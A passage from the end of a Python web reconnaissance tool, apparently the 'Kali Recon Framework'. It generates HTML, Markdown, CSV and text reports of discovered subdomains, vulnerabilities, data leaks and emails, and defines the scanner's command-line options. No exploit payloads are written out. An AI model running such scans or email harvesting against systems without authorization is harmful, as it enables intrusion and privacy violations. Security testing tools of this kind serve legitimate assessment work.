                th {{ background-color: #4CAF50; color: white; }}
                tr:hover {{ background-color: #f5f5f5; }}
                .vulnerability {{ background: #ffebee; padding: 15px; margin: 10px 0; border-radius: 5px; }}
                .stats {{ display: flex; justify-content: space-between; flex-wrap: wrap; }}
                .stat-box {{ flex: 1; min-width: 200px; background: white; padding: 15px; margin: 10px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; }}
                .risk-critical {{ color: #f44336; font-weight: bold; }}
                .risk-high {{ color: #ff9800; font-weight: bold; }}
                .risk-medium {{ color: #ffc107; font-weight: bold; }}
                .risk-low {{ color: #4CAF50; font-weight: bold; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🛡️ Security Assessment Report</h1>
                    <h2>Target: {self.target}</h2>
                    <p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                </div>
                
                <div class="summary">
                    <h2>📊 Executive Summary</h2>
                    <div class="stats">
                        <div class="stat-box">
                            <h3>Risk Level</h3>
                            <p class="risk-{self.results['details'].get('risk_assessment', {}).get('level', 'low').lower()}">
                                {self.results['details'].get('risk_assessment', {}).get('level', 'Unknown')}
                            </p>
                        </div>
                        <div class="stat-box">
                            <h3>Subdomains</h3>
                            <p>{self.results['summary']['subdomains']}</p>
                        </div>
                        <div class="stat-box">
                            <h3>Vulnerabilities</h3>
                            <p>{self.results['summary']['vulnerabilities']}</p>
                        </div>
                        <div class="stat-box">
                            <h3>Data Leaks</h3>
                            <p>{self.results['summary']['data_leaks']}</p>
                        </div>
                    </div>
                </div>
        """
        
        # Add vulnerabilities section
        if self.results['details']['vulnerabilities']:
            html_template += """
                <div class="section critical">
                    <h2>🚨 Security Vulnerabilities</h2>
            """
            
            # Group by severity
            by_severity = {'Critical': [], 'High': [], 'Medium': [], 'Low': []}
            for vuln in self.results['details']['vulnerabilities']:
                severity = vuln.get('severity', 'Low')
                by_severity[severity].append(vuln)
            
            for severity in ['Critical', 'High', 'Medium', 'Low']:
                if by_severity[severity]:
                    html_template += f"<h3>{severity} Severity ({len(by_severity[severity])})</h3>"
                    for vuln in by_severity[severity][:10]:  # Limit to 10 per severity
                        html_template += f"""
                            <div class="vulnerability">
                                <h4>{vuln.get('type', 'Unknown')}</h4>
                                <p><strong>URL:</strong> {vuln.get('url', 'N/A')}</p>
                                <p><strong>Confidence:</strong> {vuln.get('confidence', 'Unknown')}</p>
                                <p><strong>Payload:</strong> {vuln.get('payload', 'N/A')[:50]}...</p>
                            </div>
                        """
            
            html_template += "</div>"
        
        # Add findings sections
        sections = [
            ('🌐 Subdomains', 'subdomains', 'info'),
            ('🔧 Technologies', 'technologies', 'info'),
            ('📁 Directories', 'directories', 'info'),
            ('🔗 Endpoints', 'endpoints', 'info'),
            ('🔓 Data Leaks', 'data_leaks', 'critical'),
            ('📧 Emails', 'emails', 'info'),
            ('☁️ Cloud Info', 'cloud_info', 'info')
        ]
        
        for title, key, css_class in sections:
            if self.results['details'].get(key):
                html_template += f"""
                    <div class="section {css_class}">
                        <h2>{title}</h2>
                """
                
                data = self.results['details'][key]
                if isinstance(data, list):
                    html_template += "<ul>"
                    for item in data[:20]:  # Limit to 20 items
                        if isinstance(item, dict):
                            html_template += f"<li>{str(item)[:100]}...</li>"
                        else:
                            html_template += f"<li>{item}</li>"
                    html_template += "</ul>"
                elif isinstance(data, dict):
                    html_template += "<table><tr><th>Key</th><th>Value</th></tr>"
                    for k, v in list(data.items())[:20]:
                        html_template += f"<tr><td>{k}</td><td>{str(v)[:100]}</td></tr>"
                    html_template += "</table>"
                
                html_template += "</div>"
        
        # Add recommendations
        if self.results.get('executive_summary', {}).get('recommendations'):
            html_template += """
                <div class="section">
                    <h2>💡 Recommendations</h2>
                    <ul>
            """
            for rec in self.results['executive_summary']['recommendations'][:10]:
                html_template += f"<li>{rec}</li>"
            html_template += """
                    </ul>
                </div>
            """
        
        html_template += """
                <footer style="text-align: center; margin-top: 40px; padding: 20px; color: #666; border-top: 1px solid #eee;">
                    <p>Generated by Kali Recon Framework | For authorized security testing only</p>
                    <p>Scan completed in {:.2f} seconds</p>
                </footer>
            </div>
        </body>
        </html>
        """.format(time.time() - self.stats['start_time'])
        
        with open(html_file, 'w') as f:
            f.write(html_template)
        
        logger.info(f"{Fore.GREEN}[+] HTML report saved: {html_file}")
    
    def _generate_markdown_report(self):
        """Generate Markdown report"""
        md_file = os.path.join(self.config.output_dir, 'reports', 'report.md')
        
        md_content = f"""# Security Assessment Report

## Target Information
- **URL**: {self.target}
- **Domain**: {self.domain}
- **Scan Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- **Scan Duration**: {time.time() - self.stats['start_time']:.2f} seconds

## Executive Summary

### Risk Assessment
- **Overall Risk Level**: {self.results['details'].get('risk_assessment', {}).get('level', 'Unknown')}
- **Risk Score**: {self.results['details'].get('risk_assessment', {}).get('score', 0)}/100

### Key Findings
- **Subdomains Discovered**: {self.results['summary']['subdomains']}
- **Vulnerabilities Found**: {self.results['summary']['vulnerabilities']}
- **Data Leaks Identified**: {self.results['summary']['data_leaks']}
- **Emails Collected**: {self.results['summary']['emails']}

## Detailed Findings

### Security Vulnerabilities
"""
        
        # Add vulnerabilities
        vulnerabilities = self.results['details'].get('vulnerabilities', [])
        if vulnerabilities:
            for vuln in vulnerabilities[:20]:
                md_content += f"""
#### {vuln.get('type', 'Unknown')}
- **Severity**: {vuln.get('severity', 'Unknown')}
- **URL**: {vuln.get('url', 'N/A')}
- **Confidence**: {vuln.get('confidence', 'Unknown')}
- **Payload**: {vuln.get('payload', 'N/A')[:50]}
"""
        else:
            md_content += "No vulnerabilities found.\n"
        
        # Add other findings
        md_content += """
### Discovered Subdomains
"""
        subdomains = self.results['details'].get('subdomains', [])
        for subdomain in subdomains[:20]:
            md_content += f"- {subdomain}\n"
        
        md_content += """
### Technology Stack
"""
        tech_stack = self.results['details'].get('technologies', {})
        for key, value in tech_stack.items():
            if value:
                md_content += f"- **{key}**: {value}\n"
        
        md_content += """
## Recommendations
"""
        recommendations = self.results.get('executive_summary', {}).get('recommendations', [])
        for i, rec in enumerate(recommendations[:10], 1):
            md_content += f"{i}. {rec}\n"
        
        md_content += """
## Disclaimer
This report is for **authorized security testing only**. All findings should be verified and validated.
"""
        
        with open(md_file, 'w') as f:
            f.write(md_content)
        
        logger.info(f"{Fore.GREEN}[+] Markdown report saved: {md_file}")
    
    def _generate_csv_report(self):
        """Generate CSV reports"""
        # Vulnerabilities CSV
        vuln_file = os.path.join(self.config.output_dir, 'reports', 'vulnerabilities.csv')
        vulnerabilities = self.results['details'].get('vulnerabilities', [])
        
        if vulnerabilities:
            with open(vuln_file, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=['type', 'severity', 'url', 'confidence', 'payload'])
                writer.writeheader()
                for vuln in vulnerabilities:
                    writer.writerow({
                        'type': vuln.get('type', ''),
                        'severity': vuln.get('severity', ''),
                        'url': vuln.get('url', ''),
                        'confidence': vuln.get('confidence', ''),
                        'payload': str(vuln.get('payload', ''))[:100]
                    })
            
            logger.info(f"{Fore.GREEN}[+] CSV report saved: {vuln_file}")
    
    def _generate_executive_report(self):
        """Generate executive report (PDF)"""
        # Note: Would require additional libraries like reportlab or weasyprint
        # For now, creating a text version
        exec_file = os.path.join(self.config.output_dir, 'reports', 'executive_report.txt')
        
        with open(exec_file, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("EXECUTIVE SECURITY ASSESSMENT REPORT\n")
            f.write("=" * 80 + "\n\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d')}\n")
            f.write(f"Duration: {time.time() - self.stats['start_time']:.2f} seconds\n\n")
            
            f.write("SUMMARY\n")
            f.write("-" * 40 + "\n")
            f.write(f"Overall Risk: {self.results['details'].get('risk_assessment', {}).get('level', 'Unknown')}\n")
            f.write(f"Critical Findings: {len([v for v in self.results['details']['vulnerabilities'] if v.get('severity') == 'Critical'])}\n")
            f.write(f"High Findings: {len([v for v in self.results['details']['vulnerabilities'] if v.get('severity') == 'High'])}\n\n")
            
            f.write("KEY RECOMMENDATIONS\n")
            f.write("-" * 40 + "\n")
            recommendations = self.results.get('executive_summary', {}).get('recommendations', [])
            for i, rec in enumerate(recommendations[:5], 1):
                f.write(f"{i}. {rec}\n")
            
            f.write("\n" + "=" * 80 + "\n")
            f.write("END OF REPORT\n")
            f.write("=" * 80 + "\n")
        
        logger.info(f"{Fore.GREEN}[+] Executive report saved: {exec_file}")
    
    def run_comprehensive_scan(self):
        """Run comprehensive reconnaissance scan"""
        logger.info(f"{Fore.MAGENTA}{'='*80}")
        logger.info(f"{Fore.MAGENTA}[*] KALI RECON FRAMEWORK - COMPREHENSIVE SCAN")
        logger.info(f"{Fore.MAGENTA}[*] Target: {self.target}")
        logger.info(f"{Fore.MAGENTA}[*] Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        logger.info(f"{Fore.MAGENTA}{'='*80}")
        
        try:
            # Run automated workflow
            self.automated_workflow()
            
            # Final statistics
            elapsed = time.time() - self.stats['start_time']
            logger.info(f"{Fore.MAGENTA}{'='*80}")
            logger.info(f"{Fore.MAGENTA}[*] SCAN COMPLETED SUCCESSFULLY")
            logger.info(f"{Fore.MAGENTA}[*] Total time: {elapsed:.2f} seconds")
            logger.info(f"{Fore.MAGENTA}[*] Requests made: {self.stats['requests_made']}")
            logger.info(f"{Fore.MAGENTA}[*] Results saved to: {self.config.output_dir}")
            logger.info(f"{Fore.MAGENTA}{'='*80}")
            
            # Print summary
            self._print_summary()
            
        except KeyboardInterrupt:
            logger.error(f"{Fore.RED}[!] Scan interrupted by user")
            self.generate_comprehensive_reports()
        except Exception as e:
            logger.error(f"{Fore.RED}[!] Scan failed: {e}")
            import traceback
            traceback.print_exc()
    
    def _print_summary(self):
        """Print scan summary"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.CYAN}📊 SCAN SUMMARY")
        print(f"{Fore.CYAN}{'='*80}")
        
        summary = [
            (f"{Fore.GREEN}✅ Subdomains Found", str(self.results['summary']['subdomains'])),
            (f"{Fore.GREEN}✅ IP Addresses", str(len(self.results['details']['ips']))),
            (f"{Fore.YELLOW}⚠️ Vulnerabilities", str(self.results['summary']['vulnerabilities'])),
            (f"{Fore.RED}🔓 Data Leaks", str(self.results['summary']['data_leaks'])),
            (f"{Fore.BLUE}📧 Emails", str(self.results['summary']['emails'])),
            (f"{Fore.MAGENTA}🎯 Risk Level", self.results['details'].get('risk_assessment', {}).get('level', 'Unknown'))
        ]
        
        for label, value in summary:
            print(f"{label}: {Fore.WHITE}{value}")
        
        print(f"{Fore.CYAN}{'='*80}")
        print(f"{Fore.CYAN}📁 Reports saved to: {self.config.output_dir}/reports/")
        print(f"{Fore.CYAN}{'='*80}")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='Kali Linux Advanced Web Reconnaissance Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://example.com
  %(prog)s example.com --output /opt/recon --threads 50
  %(prog)s https://test.com --modules dns subdomains vuln
  %(prog)s target.com --depth 3 --rate-limit 5

Available Modules:
  dns, subdomains, ports, technology, directories, endpoints,
  vulnerabilities, data_leakage, cloud, waf, ssl, email, social,
  osint, network, apis, mobile, iot
        """
    )
    
    parser.add_argument('target', help='Target URL or domain')
    parser.add_argument('-o', '--output', default='kali_recon_results',
                       help='Output directory (default: kali_recon_results)')
    parser.add_argument('-t', '--threads', type=int, default=20,
                       help='Number of threads (default: 20)')
    parser.add_argument('--timeout', type=int, default=30,
                       help='Request timeout in seconds (default: 30)')
    parser.add_argument('--user-agent', default=None,
                       help='Custom user agent string')
    parser.add_argument('--wordlist-dir', default='/usr/share/seclists',
                       help='Path to SecLists directory (default: /usr/share/seclists)')
    parser.add_argument('--modules', nargs='+', default=['all'],
                       help='Modules to run (default: all)')
    parser.add_argument('--depth', type=int, choices=[1, 2, 3], default=2,
                       help='Scan depth: 1=Quick, 2=Standard, 3=Deep (default: 2)')
    parser.add_argument('--proxy', help='Proxy server (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--rate-limit', type=int, default=10,
                       help='Requests per second (default: 10)')
    parser.add_argument('--no-kali-tools', action='store_true',
                       help='Disable Kali tools integration')
    parser.add_argument('--quick', action='store_true',
                       help='Quick scan (equivalent to --depth 1)')
    parser.add_argument('--deep', action='store_true',
                       help='Deep scan (equivalent to --depth 3)')
    
    args = parser.parse_args()
    
    # Adjust depth based on flags
    if args.quick:
        args.depth = 1
    elif args.deep:
        args.depth = 3
    
    # Parse modules
    modules = []
    if 'all' in args.modules:
        modules = list(ReconModule)
    else:
        for module_name in args.modules:
            try:
                module = ReconModule(module_name)
                modules.append(module)
            except ValueError:
                print(f"{Fore.RED}[!] Invalid module: {module_name}")
                sys.exit(1)
    
    # Create configuration
    config = ReconConfig(
        target=args.target,
        output_dir=args.output,
        threads=args.threads,
        timeout=args.timeout,
        user_agent=args.user_agent or "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        wordlist_dir=args.wordlist_dir,
        modules=modules,
        depth=args.depth,
        proxy=args.proxy,
        rate_limit=args.rate_limit
    )
    
    # Banner
    banner = f"""
{Fore.MAGENTA}{'='*80}{Fore.RESET}
{Fore.CYAN}
        ██████╗  █████╗ ██╗   ██╗███████╗███╗   ██╗
        ██╔══██╗██╔══██╗██║   ██║██╔════╝████╗  ██║
        ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║
        ██╔══██╗██╔══██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
        ██║  ██║██║  ██║ ╚████╔╝ ███████╗██║ ╚████║
        ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝
{Fore.YELLOW}   ── Silent Eyes • Endless Reach ──
{Fore.YELLOW} Advanced Web Reconnaissance Framework By
{Fore.RED}                Yx0R 
{Fore.RED} Disclaimer: FOR AUTHORIZED SECURITY TESTING ONLY
{Fore.MAGENTA}{'='*80}{Fore.RESET}
{Fore.CYAN}[*] Target: {args.target}
{Fore.CYAN}[*] Modules: {', '.join([m.value for m in modules][:5])}...
{Fore.CYAN}[*] Depth: {args.depth} ({'Quick' if args.depth == 1 else 'Standard' if args.depth == 2 else 'Deep'})
{Fore.MAGENTA}{'='*80}{Fore.RESET}
"""
    print(banner)
    
    # Check Kali environment
    if not os.path.exists('/etc/os-release'):
        print(f"{Fore.YELLOW}[!] Not running on Kali Linux - some features may be limited")
    
    if not os.path.exists(args.wordlist_dir):
        print(f"{Fore.YELLOW}[!] SecLists not found at {args.wordlist_dir}")
        print(f"{Fore.YELLOW}[!] Install with: sudo apt install seclists")
    
    try:
        # Create and run framework
        framework = KaliReconFramework(config)
        framework.run_comprehensive_scan()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrupted by user{Fore.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}{Fore.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    # Check Python version
    if sys.version_info < (3, 7):
        print(f"{Fore.RED}[!] Python 3.7 or higher is required{Fore.RESET}")
        sys.exit(1)
    
    # Run main function
    main()